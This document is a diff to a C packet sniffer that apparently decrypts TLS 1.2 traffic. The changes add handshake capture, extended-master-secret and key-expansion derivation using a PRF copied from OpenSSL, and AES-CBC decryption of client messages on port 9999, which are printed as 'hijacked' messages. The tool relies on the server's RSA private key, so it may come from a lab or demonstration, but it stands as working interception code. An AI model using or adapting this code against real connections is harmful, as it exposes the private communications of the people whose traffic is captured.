@@ -49,31 +49,131 @@
 #define TX_DATA_OFFSET TPACKET_ALIGN(sizeof(struct tpacket2_hdr))
 #define RX_DATA_OFFSET TX_DATA_OFFSET + 34
 
-static uint8_t client_random[32] = {0};
-static uint8_t server_random[32] = {0};
+uint8_t session_info[8129] = {0};
+int session_info_len = 0;
 
-static uint8_t premaster_raw[512] = {0};
-static uint8_t master[128] = {0};
+uint8_t session_hash[32] = {0};
 
-static EVP_PKEY* priv_key = NULL;
+uint8_t client_random[32] = {0};
+uint8_t server_random[32] = {0};
 
-static EVP_CIPHER* cipher;
-static uint8_t cbc_key[32];
+uint8_t premaster_raw[512] = {0};
+uint8_t master[48] = {0};
+uint8_t master_keymat[160] = {0};
+
+uint8_t client_write_mac[32] = {0};
+uint8_t server_write_mac[32] = {0};
+uint8_t client_write_key[32] = {0};
+uint8_t server_write_key[32] = {0};
+uint8_t client_write_iv[16] = {0};
+uint8_t server_write_iv[16] = {0};
+
+EVP_PKEY* priv_key = NULL;
+
+EVP_CIPHER* cipher;
+
+uint8_t hacked_message[2048] = {0};
+
 
 #define IVLEN 16
 
-static uint8_t stage = 0x01;
+uint8_t stage = 0x01;
 
+/*
+ *  steal start
+ *  https://github.com/openssl/openssl/blob/master/providers/implementations/kdfs/tls1_prf.c
+ *
+*/
+static int tls1_prf_P_hash(EVP_MAC_CTX *ctx_init,
+                           const unsigned char *sec, size_t sec_len,
+                           const unsigned char *seed, size_t seed_len,
+                           unsigned char *out, size_t olen)
+{
+    size_t chunk;
+    EVP_MAC_CTX *ctx = NULL, *ctx_Ai = NULL;
+    unsigned char Ai[EVP_MAX_MD_SIZE];
+    size_t Ai_len;
+    int ret = 0;
+
+    if (!EVP_MAC_init(ctx_init, sec, sec_len, NULL))
+        goto err;
+    chunk = EVP_MAC_CTX_get_mac_size(ctx_init);
+    if (chunk == 0)
+        goto err;
+    /* A(0) = seed */
+    ctx_Ai = EVP_MAC_CTX_dup(ctx_init);
+    if (ctx_Ai == NULL)
+        goto err;
+    if (seed != NULL && !EVP_MAC_update(ctx_Ai, seed, seed_len))
+        goto err;
+
+    for (;;) {
+        /* calc: A(i) = HMAC_<hash>(secret, A(i-1)) */
+        if (!EVP_MAC_final(ctx_Ai, Ai, &Ai_len, sizeof(Ai)))
+            goto err;
+        EVP_MAC_CTX_free(ctx_Ai);
+        ctx_Ai = NULL;
+
+        /* calc next chunk: HMAC_<hash>(secret, A(i) + seed) */
+        ctx = EVP_MAC_CTX_dup(ctx_init);
+        if (ctx == NULL)
+            goto err;
+        if (!EVP_MAC_update(ctx, Ai, Ai_len))
+            goto err;
+        /* save state for calculating next A(i) value */
+        if (olen > chunk) {
+            ctx_Ai = EVP_MAC_CTX_dup(ctx);
+            if (ctx_Ai == NULL)
+                goto err;
+        }
+        if (seed != NULL && !EVP_MAC_update(ctx, seed, seed_len))
+            goto err;
+        if (olen <= chunk) {
+            /* last chunk - use Ai as temp bounce buffer */
+            if (!EVP_MAC_final(ctx, Ai, &Ai_len, sizeof(Ai)))
+                goto err;
+            memcpy(out, Ai, olen);
+            break;
+        }
+        if (!EVP_MAC_final(ctx, out, NULL, olen))
+            goto err;
+        EVP_MAC_CTX_free(ctx);
+        ctx = NULL;
+        out += chunk;
+        olen -= chunk;
+    }
+    ret = 1;
+
+ err:
+    EVP_MAC_CTX_free(ctx);
+    EVP_MAC_CTX_free(ctx_Ai);
+    OPENSSL_cleanse(Ai, sizeof(Ai));
+    return ret;
+}
+/*
+ * steal end
+*/
 
 static int hijack_key(){
 
     int result = -1;
 
+    int seed_len = 0;
     uint8_t seed[128] = {0};
-    EVP_KDF_CTX *kctx = NULL;
 
-    char* label = "Master-Key";
     int label_len = 0;
+    char* extended_master_secret = "extended master secret";
+    char* key_expansion = "key expansion";
+    EVP_MD_CTX* md = NULL;
+    EVP_MAC_CTX *macctx = NULL;
+
+    OSSL_PARAM params[2], *p = params;
+
+    *p++ = OSSL_PARAM_construct_utf8_string(OSSL_KDF_PARAM_DIGEST,
+        SN_sha256, strlen(SN_sha256));
+    *p = OSSL_PARAM_construct_end();
+
+    // kex + server + client
 
     RSA* rsa_priv_key = EVP_PKEY_get1_RSA(priv_key);
 
@@ -100,35 +200,53 @@ static int hijack_key(){
         goto hijack_end;
     }
 
-    label_len = strlen(label);
+    md = EVP_MD_CTX_new();
 
-    //strcpy(seed, label);
+    if(!EVP_DigestInit_ex(md, EVP_sha256(), NULL)) {
+        printf("failed digest init\n");
+        goto hijack_end;
+    }
 
-    memcpy(seed, client_random, 32);
+    if(!EVP_DigestUpdate(md, session_info, session_info_len)) {
+        printf("digest update failed\n");
+        goto hijack_end;
+    }
 
-    memcpy(seed + 32, server_random, 32);
+    printf("session info len: %d\n", session_info_len);
+    int hashlen = 0;
 
-    int seed_len = 64;
+    if(!EVP_DigestFinal_ex(md, session_hash, &hashlen)) {
+        printf("digest final\n");
+        goto hijack_end;
+    }
 
+    printf("session_hash: %d\n", hashlen);
 
-    EVP_KDF *kdf;
-    OSSL_PARAM params[5], *p = params;
+    for(int i = 0 ; i < hashlen; i++){
 
-    kdf = EVP_KDF_fetch(NULL, "TLS1-PRF", NULL);
-    kctx = EVP_KDF_CTX_new(kdf);
-    EVP_KDF_free(kdf);
+        printf("%02X", session_hash[i]);
+    }
+    printf("\n");
 
-    *p++ = OSSL_PARAM_construct_utf8_string(OSSL_KDF_PARAM_DIGEST,
-                                            SN_sha256, strlen(SN_sha256));
-    *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_SECRET,
-                                            dec_msg, (size_t)dec_len);
-    *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_LABEL,
-                                            label, (size_t)label_len);
-    *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_SEED,
-                                            seed, (size_t)seed_len);
-    *p = OSSL_PARAM_construct_end();
-    if (EVP_KDF_derive(kctx, master, 48, params) <= 0) {
-        error("EVP_KDF_derive");
+    label_len = strlen(extended_master_secret);
+
+    memcpy(seed, extended_master_secret, label_len);
+    memcpy(seed + label_len, session_hash, hashlen);
+
+    seed_len = label_len + hashlen;
+
+    printf("extended master secret: label + seedlen: %d\n", seed_len);
+
+    EVP_MAC* mac = EVP_MAC_fetch(NULL, "HMAC", NULL);
+
+    macctx = EVP_MAC_CTX_new(mac);
+
+    EVP_MAC_CTX_set_params(macctx, params);
+
+    int rt = tls1_prf_P_hash(macctx, dec_msg, dec_len, seed, seed_len, master, 48);
+
+    if(rt != 1){
+        printf("failed to get master secret\n");
         goto hijack_end;
     }
 
@@ -140,6 +258,38 @@ static int hijack_key(){
 
     printf("\n");
 
+    label_len = strlen(key_expansion);
+
+    memcpy(seed, key_expansion, label_len);
+    memcpy(seed + label_len, server_random, 32);
+    memcpy(seed + label_len + 32, client_random, 32);
+
+    seed_len = label_len + 64;
+
+    printf("key expansion: label + seedlen: %d\n", seed_len);
+
+    rt = tls1_prf_P_hash(macctx, master, 48, seed, seed_len, master_keymat, 160);
+
+    if(rt != 1){
+        printf("failed to get key expansion\n");
+        goto hijack_end;
+    }
+
+    printf("master keymat: \n  ");
+
+    for(int i = 0; i < 160; i++){
+        printf("%02X", master_keymat[i]);
+    }
+
+    printf("\n");
+
+    memcpy(client_write_mac, master_keymat, 32);
+    memcpy(server_write_mac, master_keymat + 32, 32);
+    memcpy(client_write_key, master_keymat + 64, 32);
+    memcpy(server_write_key, master_keymat + 96, 32);
+    memcpy(client_write_iv, master_keymat + 128, 16);
+    memcpy(server_write_iv, master_keymat + 144, 16);
+
     result = 1;
 
 hijack_end:
@@ -150,19 +300,27 @@ hijack_end:
     if(dec_msg != NULL){
         free(dec_msg);
     }
-    if(kctx != NULL){
-        EVP_KDF_CTX_free(kctx);
+
+    if(md != NULL){
+        EVP_MD_CTX_free(md);
     }
+
+    if(macctx != NULL){
+
+        EVP_MAC_CTX_free(macctx);
+    }
+
 
     return result;
 }
 
-static int cbc256_decrypt(uint8_t* enc_msg, int enclen, uint8_t* cbc_iv, uint8_t* plain_msg){
+static int cbc256_decrypt(uint8_t* enc_msg, int enclen, uint8_t* cbc_key, uint8_t* cbc_iv, uint8_t* plain_msg){
 
     int plaintext_len;
     int outlen, rv;
 
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+
 
     rv = EVP_DecryptInit_ex(ctx, cipher, NULL, cbc_key, cbc_iv);
 
@@ -199,6 +357,19 @@ static void sniff_action(uint8_t* dataraw){
 
     uint8_t* tcp_data = dataraw + 32;
 
+    int client2server = 0;
+
+    if(ntohs(tcp_header->dest) == 9999){
+
+        client2server = 1;
+
+    }
+
+
+    uint16_t tmp = 0;
+    uint16_t messagelen = 0;
+    uint8_t iv[16] = {0};
+
     if(tcp_header->psh){
 
         switch(stage){
@@ -211,6 +382,19 @@ static void sniff_action(uint8_t* dataraw){
                 } else {
                     break;
                 }
+
+                tmp = 0;
+                messagelen = 0;
+
+                memcpy(&tmp, tcp_data + 3, 2);
+
+                messagelen = ntohs(tmp);
+
+                memcpy(session_info + session_info_len, tcp_data + 5, messagelen);
+
+                session_info_len += (int)messagelen;
+
+                printf("slen: %d\n", session_info_len);
 
                 memcpy(client_random, tcp_data + 11, 32);
     
@@ -227,6 +411,45 @@ static void sniff_action(uint8_t* dataraw){
                     break;
                 }
 
+                tmp = 0;
+                messagelen = 0;
+                int hellolen = 0;
+                int certlen = 0;
+
+                memcpy(&tmp, tcp_data + 3, 2);
+
+                messagelen = ntohs(tmp);
+
+                memcpy(session_info + session_info_len, tcp_data + 5, messagelen);
+
+                session_info_len += (int)messagelen;
+
+                hellolen = (int)messagelen;
+
+                tmp = 0;
+                messagelen = 0;
+
+                memcpy(&tmp, tcp_data + 5 + hellolen + 3, 2);
+
+                messagelen = ntohs(tmp);
+
+                memcpy(session_info + session_info_len, tcp_data + 5 + hellolen + 5, messagelen);
+
+                session_info_len += (int)messagelen;
+
+                certlen = (int)messagelen;
+
+                tmp = 0;
+                messagelen = 0;
+
+                memcpy(&tmp, tcp_data + 5 + hellolen + 5 + certlen + 3, 2);
+
+                messagelen = ntohs(tmp);
+
+                memcpy(session_info + session_info_len, tcp_data + 5 + hellolen + 5 + certlen + 5, messagelen);
+
+                session_info_len += (int)messagelen;
+
                 memcpy(server_random, tcp_data + 11, 32);
 
                 stage = 0x10;
@@ -241,6 +464,17 @@ static void sniff_action(uint8_t* dataraw){
                 } else {
                     break;
                 }
+
+                tmp = 0;
+                messagelen = 0;
+
+                memcpy(&tmp, tcp_data + 3, 2);
+
+                messagelen = ntohs(tmp);
+
+                memcpy(session_info + session_info_len, tcp_data + 5, messagelen);
+
+                session_info_len += (int)messagelen;
 
                 memcpy(premaster_raw, tcp_data + 11, 512);
     
@@ -269,8 +503,32 @@ static void sniff_action(uint8_t* dataraw){
                 break;
     
             default:
-                
-                printf("message: \n");
+            
+                if(client2server && (*(tcp_data) & 0x17)){
+
+                    memset(hacked_message, 0, 2048);
+                    printf("message: ");
+                    tmp = 0;
+                    uint16_t payloadlen = 0;
+                    memcpy(&tmp, tcp_data + 3, 2);
+                    payloadlen = ntohs(tmp);
+
+                    memcpy(iv, tcp_data + 5, 16);
+                    printf("payloadlen: %d\n", payloadlen);
+                    payloadlen -= 16; // iv
+                    payloadlen -= 32; // mac
+
+                    int decresult = cbc256_decrypt(tcp_data + 21, (int)payloadlen, client_write_key, iv, hacked_message);
+
+                    if(decresult < 1){
+                        printf("failed to decrypt message\n");
+                    }else {
+     
+                        printf("    😈 TLSv1.2 hijacked message 😈\n");
+                        printf("    \033[31m%s\033[0m\n", hacked_message);
+                    }
+
+                }
     
                 break;
         }
@@ -492,7 +750,7 @@ void do_serve(){
         while (pkt = process_rx(rxFd, rxRing, &len)){
 
             uint8_t* off = ((void*)pkt) + RX_DATA_OFFSET;
-            printf("server RX: %d \n", count);
+            printf("packet RX: %d \n", count);
             sniff_packet(off);
             printf("\n");
             process_rx_release(pkt);
